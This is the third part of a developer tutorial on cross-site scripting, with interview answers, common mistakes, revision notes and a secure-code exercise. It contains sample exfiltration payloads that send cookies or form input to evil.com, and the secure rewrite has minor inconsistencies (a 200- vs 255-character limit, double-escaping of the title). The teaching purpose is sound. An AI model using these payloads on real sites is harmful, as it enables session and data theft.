# XSS Attack — Part 3 of 3

### Sections: 9 (Interview Prep), 10 (Common Developer Mistakes), 11 (Quick Revision), 12 (Security Thinking Exercise)

**Series:** Authentication & Security → Topic 07

---

## SECTION 9 — Interview Prep: Layered Answers

### Beginner Level

**Q: What is a Cross-Site Scripting (XSS) attack?**

```
XSS is an attack where an attacker injects malicious JavaScript into a webpage,
and that script runs in other users' browsers on your domain.

Example:
  Your site has a comment section. Attacker posts a comment:
  <script>fetch('https://evil.com?c='+document.cookie)</script>

  If your server stores this and renders it as HTML:
  Every user who reads the comments runs the attacker's code.
  The code runs on YOUR domain — stealing sessions, calling your API, capturing keystrokes.

Root cause: HTML mixes content with executable code.
             When user input is inserted into HTML without encoding, the browser
             can't distinguish developer code from attacker-injected code.
```

**Q: What's the difference between Stored, Reflected, and DOM XSS?**

```
Stored XSS: Payload stored in the database. Every viewer is affected.
  How: Attacker posts a comment with a script tag.
  Who's hit: Every user who views that comment.
  Impact: Broadest — can affect thousands of users from one injection.

Reflected XSS: Payload in the URL, reflected in the response. Victim must click a link.
  How: https://site.com/search?q=<script>alert(1)</script>
  Who's hit: Anyone who clicks the attacker's crafted link.
  Impact: Narrower — requires social engineering per victim.

DOM XSS: Payload in URL (hash/query), processed by client-side JS, never hits server.
  How: App's own JS reads URL hash → writes to innerHTML.
  Who's hit: Anyone who clicks the link.
  Impact: Bypasses server-side WAFs and filters — server's response is clean.
```

---

### Intermediate Level

**Q: How does Content Security Policy prevent XSS?**

```
CSP is a response header that tells the browser which scripts are allowed to execute.

Classic XSS: Attacker injects <script>alert(1)</script> into your page.
Without CSP: browser executes it.
With CSP (nonce-based): browser checks: does this script have the correct nonce?
  <script nonce="a9Fz...">legitimate code</script>  ← Has nonce: runs.
  <script>alert(1)</script>  ← No nonce: browser blocks execution.

The nonce is a random value generated per-request by the server.
Only your server knows it. Attacker-injected scripts don't have it.

CSP directive example:
  Content-Security-Policy: script-src 'self' 'nonce-a9Fz...'

IMPORTANT: CSP is defense-in-depth, not the primary fix.
The primary fix is: never insert user input into HTML without encoding/sanitizing.
CSP limits what an attacker can DO even if an XSS payload somehow executes.
```

**Q: Why is localStorage not safe for storing auth tokens?**

```
localStorage is accessible to any JavaScript running on your page.
If you have an XSS vulnerability: the script runs on your origin.
The script can trivially: localStorage.getItem('authToken')

HttpOnly cookies: not accessible via JavaScript. document.cookie doesn't show them.
XSS can still make authenticated requests (using the cookie the browser auto-sends)
but cannot exfiltrate the cookie value itself.

COMPARISON:
  localStorage or sessionStorage: XSS → instant token theft → 401 bypass anywhere.
  HttpOnly cookie: XSS → can make API calls but cannot steal the token.

  Both are bad if you have XSS. But HttpOnly limits what the attacker can do AFTER your site.
  They can't take your token to another tool — only use it from within your page.

RULE: Auth tokens, session IDs: always in HttpOnly, Secure, SameSite cookies.
      Never in localStorage, sessionStorage, regular cookies, or window variables.
```

---

### Senior/Advanced Level

**Q: How would you audit a codebase for XSS vulnerabilities?**

```
SYSTEMATIC APPROACH:

STEP 1 — Identify all sources (where does user-controlled data enter?):
  req.body, req.query, req.params — HTTP request fields
  req.headers — User-Agent, Referer, custom headers
  URL hash (client-side only)
  Stored user content (database reads — fetch data stored from form submissions)
  Third-party API responses (an XSS attack on external API = XSS on your site)

STEP 2 — Identify all sinks (where is data inserted into HTML/DOM?):
  Server side: <%= %> vs <%- %> in templates (EJS), {{ }} vs {{{ }}} (Handlebars)
  Server side: res.send() with interpolated strings
  Client side: innerHTML, outerHTML, document.write, document.writeln
  Client side: element.insertAdjacentHTML()
  Client side: eval(), Function(), setTimeout(string), setInterval(string)
  Client side: location.href = (for javascript: URI injection)

STEP 3 — Trace data flow from each source to each sink:
  Does user input from /profile bio → get stored → later retrieved → rendered with innerHTML?

STEP 4 — Check encoding at EVERY insertion point:
  Is it escaped/sanitized at the point of HTML insertion?
  Does the escape match the context (HTML body vs attribute vs JS vs URL)?

STEP 5 — Verify CSP headers:
  Is there a strong CSP? Does it use nonces or hashes?
  Does it allow unsafe-inline or unsafe-eval? (Both defeat CSP for XSS)

STEP 6 — Third-party scripts:
  Every <script src="..."> is a potential XSS surface.
  Do they use SRI (integrity attribute)?
  Are they self-hosted or CDN-hosted?

AUTOMATED TOOLS:
  Static: semgrep rules for XSS sinks, ESLint security plugin
  Dynamic: OWASP ZAP, Burp Suite scanner, Nikto
  Browser: Chrome DevTools CSP violation panel
```

---

## SECTION 10 — 10 Common Developer Mistakes

### Mistake 1: Using innerHTML with User Data

```javascript
// WRONG: innerHTML parses HTML — including scripts and event handlers
const userBio = req.body.bio; // "Hello <img src=x onerror=alert(1)>"
document.getElementById("bio").innerHTML = userBio; // Executes onerror

// RIGHT: textContent for plain text (always safe)
document.getElementById("bio").textContent = userBio; // Renders as literal text

// RIGHT: DOMPurify for sanitized HTML (when you NEED to render formatting)
document.getElementById("bio").innerHTML = DOMPurify.sanitize(userBio);
```

### Mistake 2: Unescaped Template Rendering

```javascript
// WRONG: Raw output in EJS template
// file: views/search.ejs
// <p>Search results for: <%- query %></p>   ← <%- is RAW, no escaping!

// RIGHT: Auto-escaped output
// <p>Search results for: <%= query %></p>   ← <%= auto-escapes HTML chars
```

### Mistake 3: CSP with unsafe-inline

```
// WRONG: CSP that defeats its own purpose
Content-Security-Policy: script-src 'self' 'unsafe-inline'

'unsafe-inline' means: all inline <script> tags and event handlers (onclick, onerror) are allowed.
This is exactly what XSS injects — inline scripts/handlers.
A CSP with unsafe-inline provides ZERO protection against XSS.

// RIGHT: Nonce-based CSP (no unsafe-inline)
Content-Security-Policy: script-src 'self' 'nonce-{random-per-request}'
```

### Mistake 4: eval() or Function() with User Input

```javascript
// WRONG: eval is a direct script execution sink
const userFormula = req.body.formula; // "2+2; fetch('...')"
const result = eval(userFormula); // Executes arbitrary code

// ALSO WRONG:
new Function(userCode)();
setTimeout(userString, 0);
setInterval(userString, 0);

// RIGHT: Use a safe expression evaluator (e.g., math.js for formulas)
import { evaluate } from "mathjs";
const result = evaluate(userFormula); // Sandboxed math expressions only
```

### Mistake 5: Storing Raw HTML in the Database

```javascript
// WRONG: Storing user HTML as-is, planning to "encode at render time"
await db.query("INSERT INTO posts (content) VALUES (?)", [req.body.content]);
// If render-time encoding is ever missed (one engineer, one template, one <%- instead of <%=):
// Stored XSS activates.

// RIGHT: Sanitize at WRITE time (defense in depth: clean earlier, encode later)
const safeContent = DOMPurify.sanitize(req.body.content); // Strip script tags at write
await db.query("INSERT INTO posts (content) VALUES (?)", [safeContent]);
// AND: still use safe templates at render time (double protection).
```

### Mistake 6: Reflecting User Input in Error Messages

```javascript
// WRONG: User-provided value reflected unsanitized in error response
app.get("/user/:id", (req, res) => {
  const userId = req.params.id;
  if (!isValidId(userId)) {
    return res.send(`Invalid user ID: ${userId}`); // REFLECTED XSS if browser renders this
  }
  // ...
});
// URL: /user/<script>alert(1)</script>
// Response: Invalid user ID: <script>alert(1)</script>
// Browser renders this inline HTML → XSS

// RIGHT: Generic error message, no reflection of user input
app.get("/user/:id", (req, res) => {
  const userId = req.params.id;
  if (!isValidId(userId)) {
    return res.status(400).json({ error: "INVALID_USER_ID" }); // JSON, no HTML
  }
});
```

### Mistake 7: Missing X-Content-Type-Options Header

```
// WRONG: No X-Content-Type-Options header
// Browser MIME sniffing: if server serves text/plain but content looks like HTML,
// older browsers may render it as HTML. Text file with <script> in it = XSS.

// RIGHT: Set X-Content-Type-Options: nosniff
app.use(helmet());  // helmet() sets X-Content-Type-Options: nosniff by default
// OR manually:
res.setHeader('X-Content-Type-Options', 'nosniff');
// Browser: "Trust the Content-Type header. Don't sniff." — prevents MIME confusion XSS.
```

### Mistake 8: Third-Party Scripts Without SRI

```html
<!-- WRONG: Third-party script with no integrity check -->
<script src="https://cdn.example.com/lib.js"></script>
<!-- If cdn.example.com is compromised: malicious script runs as your code -->

<!-- RIGHT: SRI hash locks to exact file content -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-<base64-hash>"
  crossorigin="anonymous"
></script>
<!-- Tampered file → hash mismatch → browser blocks execution -->
```

### Mistake 9: Trusting User Content Passed to href/src Attributes

```javascript
// WRONG: User-controlled URL in href — javascript: URI attack
const userUrl = req.body.website; // "javascript:alert(document.cookie)"
const html = `<a href="${userUrl}">Visit Website</a>`;
// Click → executes javascript: URI

// RIGHT: Validate URL scheme
function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    if (!["http:", "https:"].includes(parsed.protocol)) return "#";
    return url;
  } catch {
    return "#";
  }
}
const safeUrl = sanitizeUrl(userUrl);
const html = `<a href="${escapeHtml(safeUrl)}">Visit Website</a>`;
```

### Mistake 10: Angular/Vue/React Bypasses

```javascript
// WRONG: Angular bypassSecurityTrustHtml() with user content
import { DomSanitizer } from "@angular/platform-browser";
// this.htmlContent = this.sanitizer.bypassSecurityTrustHtml(userInput);
// bypasses Angular's built-in sanitization. Use only for 100% trusted content.

// WRONG: Vue v-html directive with user content
// <div v-html="userPost"></div>  ← Same as innerHTML

// WRONG: React dangerouslySetInnerHTML without sanitization
// <div dangerouslySetInnerHTML={{ __html: userContent }} />  ← XSS vector

// RIGHT in each framework:
// Angular: [innerHTML]="trustedHtml" where trustedHtml = DomSanitizer.sanitize(ctx, html)
// Vue:     :textContent="userText"  OR  v-html="DOMPurify.sanitize(userHtml)"
// React:   {userText}               OR  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }}
```

---

## SECTION 11 — Quick Revision

### 10 Key Takeaways

1. **XSS = attacker code runs on YOUR domain**: Full access to cookies, API, DOM, keyboard — everything the browser has on your origin.

2. **Three types**: Stored (database → all viewers), Reflected (URL → one victim), DOM (client JS reads URL → DOM sink — server never sees payload).

3. **Root cause**: User input inserted into HTML without encoding — browser can't distinguish developer code from attacker-injected code.

4. **Primary fix**: Escape output per context. HTML body: HTML entities. Attribute: HTML attribute escape. JavaScript: JSON.stringify. URL: encodeURIComponent.

5. **For rich text**: Use DOMPurify allow-list sanitization before `innerHTML`. Never trust raw user HTML.

6. **textContent > innerHTML**: Use `textContent` for all plain text insertions. `innerHTML` parses HTML — including event handlers.

7. **Content Security Policy**: Browser-side enforcement. Nonce-based policy blocks all injected scripts. Defense-in-depth after encoding.

8. **HttpOnly cookies limit XSS impact**: XSS can't steal HttpOnly cookies via `document.cookie`. It can still make authenticated requests — but can't exfiltrate the token to another tool.

9. **Third-party scripts = your XSS surface**: Every `<script src="ext...">` is a supply chain risk. Use SRI hashes. Self-host critical dependencies.

10. **CSP with `unsafe-inline` = no CSP**: If you allow `unsafe-inline`, inline scripts (which is what XSS injects) are allowed. That CSP provides zero XSS protection.

---

### 30-Second Interview Answer

**"How do you prevent XSS?"**

```
"XSS happens when user input is inserted into HTML and executed as code.
My primary defense is output encoding: always escape user data for the context —
HTML entities for HTML body, textContent instead of innerHTML for DOM manipulation.

For rich text that must allow some HTML, I use DOMPurify — an allow-list sanitizer
that strips script tags and event handlers but preserves formatting tags.

As defense in depth, I add a nonce-based Content Security Policy:
each response gets a unique nonce, and only scripts with that nonce can execute.
Even if an attacker injects a script tag, it won't have the nonce → browser blocks it.

Auth tokens are always in HttpOnly cookies — never localStorage —
which limits what XSS can steal even if a vulnerability exists."
```

---

### Mnemonics

```
XSS TYPES:
  S — Stored (database, hits all users)
  R — Reflected (URL, hits click victims)
  D — DOM (client JS sink, bypasses server filters)

ENCODE (Output encoding rules):
  E — Escape for HTML context (< > & " ')
  N — Never innerHTML with user data (use textContent)
  C — Context-specific encoding (HTML vs JS vs URL vs CSS)
  O — Output at render time (escape close to the sink, not at input)
  D — DOMPurify for allowed HTML
  E — Evaluate nothing from user input (no eval, Function, setTimeout(string))

CSP:
  C — Content policy declared in header
  S — Script source restricted (only nonce-bearing scripts run)
  P — Protects even when injection succeeds (defense in depth)
```

---

## SECTION 12 — Security Thinking Exercise

### Scenario: PostBoard Social App

Review of a social posting app's content handling:

```javascript
// posts.js — Backend
app.post("/api/posts", authenticate, async (req, res) => {
  const { title, content } = req.body;
  // "Users can format their posts with HTML — it's a feature!" — Product Manager
  await db.query(
    "INSERT INTO posts (title, content, user_id) VALUES (?, ?, ?)",
    [title, content, req.user.id],
  );
  res.json({ success: true });
});

app.get("/api/posts/:id", async (req, res) => {
  const post = await db.query("SELECT * FROM posts WHERE id = ?", [
    req.params.id,
  ]);
  res.json(post);
});

// frontend/PostView.jsx
function PostView({ postId }) {
  const [post, setPost] = useState(null);

  useEffect(() => {
    fetch(`/api/posts/${postId}`)
      .then((r) => r.json())
      .then(setPost);
  }, [postId]);

  if (!post) return <div>Loading...</div>;

  return (
    <div>
      <h2>{post.title}</h2> {/* SAFE */}
      <div dangerouslySetInnerHTML={{ __html: post.content }} /> {/* ??? */}
    </div>
  );
}

// index.js
app.use(express.json());
app.use(express.static("public"));
// No additional security headers configured.
```

---

### Your Task

**What XSS vulnerabilities exist? What's the blast radius? Provide the secure version.**

---

### Analysis: Problems Found

```
PROBLEM 1: dangerouslySetInnerHTML with unfiltered database content (CRITICAL)
  Content stored raw in DB (any HTML). Rendered via dangerouslySetInnerHTML.
  Any user can post: <script>fetch('/api/admin/users').then(r=>r.json()).then(data=>{...})</script>
  OR: <img src=x onerror="document.querySelectorAll('input').forEach(i=>navigator.sendBeacon('https://evil.com',i.value))">
  Impact: Stored XSS. Every viewer of any post runs attacker's code.

PROBLEM 2: No sanitization at write time (HIGH)
  Raw HTML stored in DB without DOMPurify or any processing.
  Even if frontend is fixed: another rendering path (mobile app, email digest)
  that reads the same DB content could be vulnerable.

PROBLEM 3: No CSP header (HIGH)
  No Content-Security-Policy header set.
  Even if sanitization is imperfect: no last-resort CSP to block injected scripts.
  Any XSS bypass (new DOMPurify bypass, developer mistake) → immediate execution.

PROBLEM 4: No security headers (MEDIUM)
  No X-Content-Type-Options, X-Frame-Options, HSTS.
  Missing MIME sniffing protection, clickjacking protection, HTTPS enforcement.
```

### Secure Rewrite

```javascript
// posts.js — SECURE Backend
import DOMPurify from "isomorphic-dompurify"; // Server-side DOMPurify with jsdom
import helmet from "helmet";
import crypto from "crypto";

// Security headers on every response
app.use(
  helmet({
    contentSecurityPolicy: false, // We set CSP manually (need nonces)
    crossOriginEmbedderPolicy: true,
  }),
);

// CSP middleware with nonces
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.cspNonce = nonce;
  res.setHeader(
    "Content-Security-Policy",
    [
      `default-src 'self'`,
      `script-src 'self' 'nonce-${nonce}'`,
      `style-src 'self' 'nonce-${nonce}'`,
      `img-src 'self' data: https:`,
      `object-src 'none'`,
      `frame-ancestors 'none'`,
      `base-uri 'self'`,
    ].join("; "),
  );
  next();
});

app.post("/api/posts", authenticate, async (req, res) => {
  const { title, content } = req.body;

  // Sanitize at WRITE TIME — strip dangerous HTML, keep formatting
  const safeContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: [
      "p",
      "br",
      "b",
      "i",
      "em",
      "strong",
      "a",
      "ul",
      "ol",
      "li",
      "h3",
      "h4",
      "blockquote",
      "code",
    ],
    ALLOWED_ATTR: ["href"],
    ALLOW_DATA_ATTR: false,
  });

  // Escape title (plain text — no HTML allowed)
  const safeTitle = escapeHtml(String(title).slice(0, 200));

  await db.query(
    "INSERT INTO posts (title, content, user_id) VALUES ($1, $2, $3)",
    [safeTitle, safeContent, req.user.id],
  );
  res.json({ success: true });
});

// frontend/PostView.jsx — SECURE
function PostView({ postId }) {
  const [post, setPost] = useState(null);

  useEffect(() => {
    fetch(`/api/posts/${postId}`)
      .then((r) => r.json())
      .then(setPost);
  }, [postId]);

  if (!post) return <div>Loading...</div>;

  return (
    <div>
      <h2>{post.title}</h2> {/* JSX auto-escapes: safe for plain text */}
      {/* For content: sanitize again at render (defense in depth) */}
      <div
        dangerouslySetInnerHTML={{
          __html: DOMPurify.sanitize(post.content, {
            ALLOWED_TAGS: [
              "p",
              "br",
              "b",
              "i",
              "em",
              "strong",
              "a",
              "ul",
              "ol",
              "li",
              "h3",
              "h4",
              "blockquote",
              "code",
            ],
            ALLOWED_ATTR: ["href"],
          }),
        }}
      />
    </div>
  );
}

// CHANGES:
// 1. DOMPurify.sanitize() at WRITE time (allow-list of safe tags)
// 2. DOMPurify.sanitize() at RENDER time (defense in depth)
// 3. Nonce-based CSP header on all responses (blocks injected scripts)
// 4. helmet() for X-Content-Type-Options, X-Frame-Options, HSTS
// 5. escapeHtml() for title field (plain text, no HTML)
// 6. Input length limit on title (255 chars)
```
